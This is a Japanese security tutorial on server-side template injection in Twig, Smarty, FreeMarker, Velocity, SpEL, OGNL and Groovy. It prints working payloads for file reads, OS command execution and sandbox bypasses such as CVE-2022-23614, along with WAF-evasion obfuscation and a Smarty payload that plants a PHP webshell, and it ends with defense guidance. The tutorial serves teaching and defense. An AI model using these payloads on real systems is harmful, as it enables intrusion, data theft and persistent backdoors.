## PHP(Twig/Smarty)とJava(FreeMarker/Velocity/SpEL)のSSTI

### 導入: なぜテンプレートエンジンが「実行環境」になるのか

SSTI(Server-Side Template Injection、サーバサイドテンプレートインジェクション)は、テンプレートエンジンが「表示用の文字列展開」だけでなく「式(expression)の評価」まで行えることに起因する脆弱性クラスである。多くのテンプレートエンジンは、ユーザー名や商品名をページに埋め込むだけでなく、`{{ user.name }}` のように条件分岐やフィルタ処理を書けるミニ言語(DSL)を内蔵している。この機能は本来「デザイナーがロジックを軽く書けるようにする」ためのものだが、もしテンプレート文字列そのものにユーザー入力が混入する箇所(sink、入力が最終的に実行・解釈される危険な代入先)があると、攻撃者は表示用の値ではなく「テンプレート言語のコード片」を注入できる。これは典型的には次のような実装ミスで起きる。

```python
# 脆弱な例(擬似コード): ユーザー入力をテンプレート文字列として扱ってしまう
template = Template("Hello " + user_input)
render(template)
```

正しくは `render(Template("Hello {{ name }}"), name=user_input)` のように、テンプレート構造とデータを分離しなければならない。SSTIはこの分離が崩れたときに発生し、最終的にはテンプレート言語からホスト言語(PHPやJava)のネイティブ関数・クラスに到達して任意コード実行(RCE)に至ることが多い。本節ではPHP系(Twig, Smarty)とJava系(FreeMarker, Velocity, SpEL/OGNL)の主要エンジンについて、検出から任意コード実行、サンドボックス回避までを仕組みレベルで解説する。

> ⚠️ 本節は防御・検知目的の解説である。実在サービスや本番環境に対する無許可の検証は行ってはならない。

---

### PHPテンプレートエンジンのSSTI

#### Twig

Twigはデフォルトで `{{ }}`(式の出力)と `{% %}`(制御構文)という2種類のデリミタを使う。SSTIの一次検出は非常にシンプルで、次のポリグロット的な数式を入力し、`49` という計算結果がそのまま出力されるかを確認する。

```twig
{{7*7}}
```

これが `49` として反映されれば、入力がテンプレートとしてコンパイル・評価されている証拠になる(単なるエスケープ漏れのXSSであれば `7*7` という文字列がそのまま出力される)。

デバッグ用フィルタ・関数を使うと内部状態を覗ける。

```twig
{{dump(app)}}
{{dump(_context)}}
```

`dump()` はTwigのデバッグ拡張が有効な場合に、現在のコンテキスト変数(リクエストオブジェクトなど)をダンプする。これにより攻撃対象システムの構成情報が漏れることがある。

ファイル読み取り・インクルードは次のように行える。

```twig
{{'/etc/passwd'|file_excerpt(1,30)}}
{{include("wp-config.php")}}
```

`include` はTwigの標準タグで、指定パスのファイルをテンプレートとして読み込む。これはパストラバーサルと組み合わせることで任意ファイルの内容取得や、条件次第ではファイル内のPHPコードとしての実行にもつながる。

**コード実行(標準関数呼び出し)**

Twigには任意のPHP呼び出し可能関数を渡せる `filter`/`map`/`reduce` などの高階フィルタがあり、`system` や `passthru` のようなOSコマンド実行関数を渡すとRCEになる。

```twig
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}
{{['id']|map('system')|join}}
{{['id']|filter('passthru')}}
```

これらが動く理由は、Twigの `filter`/`map`/`reduce` フィルタが「第2引数に渡された呼び出し可能な名前」をPHPの `call_user_func()` 相当の仕組みでそのまま呼び出すためである。つまりTwigの式言語からPHPのグローバル関数空間に直接橋渡しできてしまう。これを防ぐのがTwigの「サンドボックス拡張」であり、許可された関数・メソッド・プロパティ・フィルタのみをホワイトリストで許可する仕組みである。

**サンドボックスバイパス(CVE-2022-23614)**

Twigにはテンプレート作者を信頼できない場合のために `SandboxExtension` があるが、過去にはこのサンドボックスをすり抜けるバイパスが複数報告されている。CVE-2022-23614はTwigのサンドボックスにおいて、`sort` フィルタに渡すコールバック引数の扱いに起因する回避手法である。

```twig
{% set a = ["error_reporting", "1"]|sort("ini_set") %}
{% set b = ["ob_start", "call_user_func"]|sort("call_user_func") %}
{{ ["id", 0]|sort("system") }}
{% set a = ["ob_end_flush", []]|sort("call_user_func_array")%}
```

このペイロードの核心は、`sort()` フィルタの第2引数(比較関数名)が「サンドボックスの許可関数リスト」のチェックをすり抜けたまま、内部的には任意の関数名として呼び出される点にある。サンドボックスは「このフィルタ自体は許可されているか」は見るが、フィルタに渡される引数が「別の関数名の文字列」であることまで一貫してチェックしていなかったため、`system` のような危険な関数名を比較関数として渡すだけで実行に到達できてしまう。修正パッチはこの引数もサンドボックスのポリシーチェック対象に含めるよう改められた。

エラーベース(出力箇所がない場合)の実行や、ブラインドでの真偽判定にも工夫がある。

```twig
{% for a in ["error_reporting", "1"]|sort("ini_set") %}{% endfor %}
{{_self.env.registerUndefinedFilterCallback("shell_exec")}}{{1/(_self.env.getFilter("id && echo UniqueString")|trim('\n') ends with "UniqueString")}}
```

`_self.env.registerUndefinedFilterCallback()` はTwig環境オブジェクトのメソッドで、「未定義のフィルタ名が呼ばれたときに、その名前をそのままコールバック(ここでは `shell_exec`)に渡して実行する」という挙動を登録する。つまり存在しないフィルタ `id && echo UniqueString` を呼び出すと、代わりに `shell_exec("id && echo UniqueString")` が実行される。この結果を `1/(...)` のようにゼロ除算エラーの有無に変換すれば、レスポンスに直接出力されない環境でもブラインドで真偽を判定できる(条件が偽ならゼロ除算例外が発生し、真ならしない、あるいはその逆になるようレスポンス差分を作る)。

**フィルタ/文字列検査回避のための難読化**

WAFや簡易なブラックリスト(`system`, `exec` などの文字列を単純に拒否するもの)を回避するため、文字列を分割・結合して構築する手法も知られている。

```twig
{%block U%}id000passthru{%endblock%}{%set x=block(_charset|first)|split(000)%}{{[x|first]|map(x|last)|join}}
```

これは `id` と `passthru` という文字列を `000` という区切り文字を挟んだブロック変数として保持し、`split` で分解、`map` で組み立てて実行する、という一種の文字列分割難読化である。ブラックリスト方式の入力検査(単純な部分文字列マッチ)がいかに回避されやすいかを示す典型例であり、防御側は「danger関数名の文字列一致」ではなく「サンドボックス+ホワイトリスト」で守る必要があることの根拠になる。

> 出典: PayloadsAllTheThings — Server Side Template Injection / PHP.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md

#### Smarty

SmartyはTwigと異なりデリミタが単一の波括弧 `{ }` である(設定変更可能)。基本検出はバージョン情報の出力で行える。

```smarty
{$smarty.version}
```

**`{php}` タグによるRCE(廃止予定機能)**

Smartyには過去、テンプレート内に生のPHPコードを書ける `{php}` ブロックが存在した。

```smarty
{php}echo `id`;{/php}
```

これはテンプレートエンジンというより「PHPをそのまま実行する穴」であり、Smarty 3系以降は非推奨(deprecated)化され、設定でも明示的に無効化されている。しかし古いテンプレートやレガシー設定を引き継いだアプリケーションでは有効なままのことがあるため、依存関係の棚卸しの際に確認すべき項目である。

**組み込み関数経由のRCE**

Smartyのテンプレート構文はPHP関数の直接呼び出しに近い形をとれるため、次のような直接的な実行も可能である。

```smarty
{system('ls')}
```

さらに、Smartyの内部クラスのstaticメソッドを悪用してWebシェルをファイルシステムに書き込む高度な手口も報告されている。

```smarty
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

これはSmartyのテンプレートコンパイラ内部に存在する「ファイル書き込み」用のユーティリティメソッドを、本来の用途(コンパイル済みキャッシュファイルの書き出し)から外れて任意のパス・内容で呼び出すことで、Webルート配下にPHPのWebシェルを設置する手法である。テンプレートエンジンの脆弱性が「一度きりのコード実行」で終わらず、永続的なバックドア設置(persistence)にまで発展しうることを示す例である。

**難読化によるフィルタ回避**

```smarty
{{passthru(implode(Null,array_map(chr(99)|cat:chr(104)|cat:chr(114),[105,100])))}}
```

`chr()` でASCIIコードから1文字ずつ文字を組み立て、`array_map`/`implode` で関数名文字列(`chr` を繰り返し使うことで例えば `id` や `passthru` などの語)を動的に構築している。これも「危険な関数名を直接書かない」ことで、正規表現ベースの入力フィルタやWAFのシグネチャマッチを回避するための典型的な難読化パターンである。

> 出典: PayloadsAllTheThings — Server Side Template Injection / PHP.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md

#### 他のPHP系エンジンとの比較(参考)

同資料には、Laravel標準のBladeエンジンや、Latte、Plates(生PHPをテンプレートとして扱う軽量エンジン)についても言及がある。Bladeは内部的にPHPへコンパイルされるため、素のPHP関数呼び出しに近い形の難読化ペイロードがそのまま動くこと、Latteは `{php ...}` に相当する直接実行ブロックを持つことが特徴で、いずれも「テンプレート言語 → ホスト言語の関数呼び出し」という同じ攻撃面の広さの違いに帰着する。

---

### Javaテンプレートエンジン / 式言語のSSTI

Java系では「テンプレートエンジン」(FreeMarker, Velocity)と「式言語」(SpEL, OGNL, EL)の両方がSSTIの温床になる。式言語はSpring MVCのバリデーションエラーメッセージや、Struts2のOGNL、Thymeleafのリンク式(`@{}`)など、アプリケーションフレームワークの奥深くに組み込まれているため、注入経路が見つかりにくく、かつ影響が大きい。

#### FreeMarker

FreeMarkerの式は `${...}` が標準、`#{...}` はレガシー構文、`[=...]` はFreeMarker 2.3.4以降で使えるスクエアブラケット構文である。基本検出は次の通り。

```
${3*3}
```

FreeMarkerが持つ `freemarker.template.utility.Execute` というビルトインユーティリティクラスは、まさに「OSコマンドを実行してその出力を文字列として返す」ためのクラスであり、これがSSTIからRCEへの最短経路になる。

```
<#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
${("xx"+("freemarker.template.utility.Execute"?new()("id")))?new()}
${"freemarker.template.utility.Execute"?new()("id && sleep 5")}
```

ここでの `?new()` はFreeMarkerの組み込みビルトインで、「文字列で指定したクラス名をインスタンス化する」という機能を持つ。つまりテンプレート言語の式の中から `new freemarker.template.utility.Execute()` 相当のオブジェクト生成ができてしまい、生成したインスタンスを関数のように呼び出すと `Runtime.exec()` 相当の処理でコマンドを実行する設計になっている。`Execute` クラスは本来「テンプレート内から安全に外部プロセスを呼びたい」というユースケースのために用意されたユーティリティだが、任意のユーザー入力がテンプレート文字列に混入する状況では、そのまま任意コマンド実行の入口になる。

フィルタで `id` や `Execute` のような文字列がブラックリスト化されている場合、FreeMarkerの `lower_abc` ビルトインで数値をアルファベットに変換する難読化が使える。

```
${9?lower_abc+4?lower_abc}
```

`?lower_abc` は数値を1=a, 2=b, ... のようにアルファベット文字へ変換するビルトインで、`9` は `i`、`4` は `d` になるため、文字列連結の結果 `"id"` が得られる。これを `Execute` クラス名の一部や引数文字列の構築に流用することで、単純な文字列一致ベースの検査を回避する。

**バージョン依存性**: 資料によれば、上記のようなサンドボックスバイパス系のテクニックはFreeMarker 2.3.30より前のバージョンでのみ機能するとされる。それ以降のバージョンではAPIの制限強化や `TemplateClassResolver` の既定動作変更などにより、任意クラスの `?new()` 生成が既定で制限される方向に修正が進んでいる(具体的な修正内容はデプロイ先のFreeMarökerバージョンのチェンジログで要確認)。したがって検知・防御を設計する際は、対象システムのFreeMarkerバージョンを必ず特定した上でリスク評価を行う必要がある。

#### Velocity

Velocityは `#set`, `#foreach`, `#include` などのディレクティブと `$変数` 参照からなる。Javaのリフレクションを介したコード実行の定番パターンは次の通り。

```java
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
#end
```

ここでの `$class.inspect("java.lang.Runtime")` はVelocity組み込みの `ClassTool`/`introspection`機構(あるいは類似のユーティリティ)を使い、クラス名の文字列から `java.lang.Class` オブジェクトを取得し、`.type` でリフレクション経由の型情報を得て `getRuntime().exec(...)` を呼び出す。Velocityの式言語自体は「メソッド呼び出し」を許すよう設計されているため、一度 `Runtime` クラスの参照を得られれば、そこから先はJavaのリフレクションAPIそのものであり、テンプレートエンジンのサンドボックスの有無に関わらず任意コード実行に直結する。出力を直接得にくいテンプレートでは、`$out.available()` の件数分だけ `#foreach` を回してストリームからバイト列を読み出す、という手作業でのI/O読み出しパターンも使われる。

ブラインド検出の手法としては、`#include()` を使ったファイル読み込みの成否によるエラーベース判定、コマンドの終了コードによる真偽判定(boolean-based)、`sleep` 相当のコマンドを実行させた際のレスポンス遅延を見る時間ベース判定、の3系統が定石として整理されている。これはSQLインジェクションのブラインド手法(エラー・真偽・時間)と同じ発想であり、「直接出力が返らないsinkでは何らかの副作用の差分を観測する」という考え方はSSTI全般に共通する。

#### SpEL(Spring Expression Language)/ EL / OGNL

SpELはSpringフレームワーク全体で使われる式言語で、Thymeleafなどのテンプレートエンジンと組み合わさることも多い。デリミタは文脈により複数存在する。

```
#{ }   ${ }   *{ }   @{ }   ~{ }
```

これらはそれぞれSpringの異なるサブシステム(SpEL式そのもの、プロパティプレースホルダ、Thymeleafの選択変数式・リンク式・フラグメント式など)に対応しており、SSTIの検出時にはどのデリミタが有効かをすべて試す必要がある。基本検出・環境変数の窃取は次の通り。

```java
${T(java.lang.Integer).valueOf('1')}
${T(java.lang.System).getenv()}
```

`T()` はSpELの「型演算子」で、完全修飾クラス名を与えると、そのクラスの `Class` オブジェクト(実質的にstaticメンバーへのアクセス起点)を取得できる。これによりテンプレート内の式から任意のJavaクラスのstaticメソッド・フィールドへ到達できるため、`T(java.lang.Runtime).getRuntime().exec(...)` のように直接プロセス起動へたどり着ける。

```java
${T(java.lang.Runtime).getRuntime().exec("id")}
```

より汎用的な引数配列を使った実行や、リフレクションでメソッド配列のインデックスを直接指定して `exec` を呼ぶパターンもある。

```java
${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(...)}
```

これは「クラス名の文字列がブロックされている場合でも、空文字列オブジェクトの `getClass().forName()` を経由すればクラス名を動的に解決できる」という迂回であり、さらに `getMethods()[6]` のようにメソッド一覧の固定インデックスで `exec` メソッドを呼び出す。インデックス番号はJavaのバージョンやクラスのメソッド宣言順に依存するため脆く、対象のJREバージョンに応じて調整が必要になる点に注意が必要である。

`ScriptEngineManager` 経由での実行は、Javaに標準搭載されているスクリプトエンジン(Nashornなど、JDKのバージョンによっては撤去済み)を呼び出してJavaScriptを実行させ、そこからさらにOSコマンドを呼ぶという二段構えの手口で、単純な `Runtime` ブラックリストを回避する目的で使われる。

ブラインド判定は次のような形で構成される。

```java
${1/((T(java.lang.Runtime).getRuntime().exec("id").waitFor()==0)?1:0)+""}
```

コマンドの終了コード(`waitFor()`)が0(成功)であれば `1/1` で正常値、そうでなければ `1/0` でゼロ除算エラーが発生する、という古典的なエラーベース/真偽ベースの複合手法である。

**OGNL(Object-Graph Navigation Language)** はStruts2などで使われる式言語で、静的メソッド呼び出しの記法がSpELと異なる。

```java
@java.lang.Integer@valueOf('1')
@java.lang.Runtime@getRuntime().exec("id")
```

`@クラス名@メンバ` という記法で静的メンバーにアクセスする点がOGNL特有の構文であり、Struts2の歴史的な重大脆弱性群(例えばContent-Typeヘッダ経由のOGNL式インジェクションなど)の多くは、この静的メソッドアクセス経路を通じて `Runtime.exec` にたどり着く形で成立していた。

**Groovy** はスクリプト言語そのものがテンプレート内に埋め込まれるケースで、`.execute()` のようにプロセス起動が言語組み込みメソッドとして提供されているため、リフレクションを介さずに直接コマンド実行できる点が他のJava式言語と異なる。

```groovy
${"calc.exe".execute()}
```

さらに `@ASTTest` アノテーションを使ったAST変換(コンパイル時にコード片を評価させる仕組み)を悪用したサンドボックス回避も報告されている。

```groovy
${ @ASTTest(value={assert java.lang.Runtime.getRuntime().exec("whoami")})def x }
```

これはGroovyのコンパイラが「コンパイルフェーズでテストアサーションを評価する」という機能を持つことを利用し、実行時のサンドボックス(メソッド呼び出しのホワイトリストなど)がまだ効いていないコンパイル時に任意コードを実行させる、という発想の異なるバイパスである。実行時のサンドボックスだけを見ていると、こうしたコンパイル時経路を見落としやすい。

> 出典: PayloadsAllTheThings — Server Side Template Injection / Java.md — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Java.md

---

### 仕組みの整理: なぜサンドボックスは破られ続けるのか

ここまでの事例を貫く共通原理は次の3点に整理できる。

1. **式言語とホスト言語の境界の薄さ**: Twigのフィルタ、FreeMarkerの `?new()`、SpELの `T()` 演算子、OGNLの `@クラス@メンバ` は、いずれも「テンプレート言語の式評価器から、ホスト言語(PHP/Java)のクラス・関数空間へ橋渡しする公式なAPI」である。これらは正規の機能として設計されているため、サンドボックスは「橋渡し自体を禁止する」のではなく「橋渡し先をホワイトリストで絞る」形にならざるを得ず、抜け穴が生まれやすい。
2. **文字列引数チェックの非対称性**: CVE-2022-23614のTwig事例が典型だが、「関数・フィルタ呼び出し自体は許可リストでチェックする」のに「その呼び出しに渡す引数(それ自体が別の関数名を意味する文字列)まではチェックしない」という非対称なチェック漏れが繰り返し発生している。防御コードをレビューする際は、許可リストが再帰的・網羅的に適用されているか(引数の中の関数名文字列まで検査対象か)を確認する必要がある。
3. **静的解析タイミングの盲点**: Groovyの `@ASTTest` の例のように、実行時のサンドボックスチェックだけを前提にしていると、コンパイル時・パース時に評価されてしまう機能(アノテーション処理、マクロ、静的初期化子など)を経由したバイパスは検知できない。サンドボックス設計では「いつコードが評価されるか」を全経路について洗い出す必要がある。

### 防御指針(まとめ)

- **最優先の対策はサンドボックスではなく「ユーザー入力をテンプレート文字列として結合しない」設計原則の徹底**である。テンプレートは常にコード側で固定文字列として用意し、ユーザー入力は変数(データ)としてのみ渡す。
- テンプレートエンジンにサンドボックス機能がある場合(Twigの`SandboxExtension`など)は最新版を使用し、既知のバイパス(CVE-2022-23614等)に対するパッチが適用されていることをバージョン管理で確認する。
- FreeMarkerでは `Execute` や `ObjectConstructor` のような危険なビルトインユーティリティクラスへのアクセスを制限する `TemplateClassResolver`/`APIBuiltinEnabled` 等の設定を明示的に無効化・制限する。
- SpEL/OGNLを利用するフレームワーク(Spring, Struts2等)では、フレームワーク自体のセキュリティアドバイザリを継続的に追跡し、既知のOGNL/SpELインジェクションCVEに対するパッチ適用状況を棚卸しする。
- ブラックリスト型の文字列フィルタ(危険関数名の禁止など)は本節で示した通り容易に難読化で回避されるため、根本対策にはならない。WAFはあくまで多層防御の一枚として扱い、単独の防御手段としないこと。

以上により、PHP系(Twig/Smarty)とJava系(FreeMarker/Velocity/SpEL/OGNL/Groovy)の主要なSSTIエンジンについて、検出・RCE到達・サンドボックス回避の仕組みと、それに対応する防御指針を整理した。
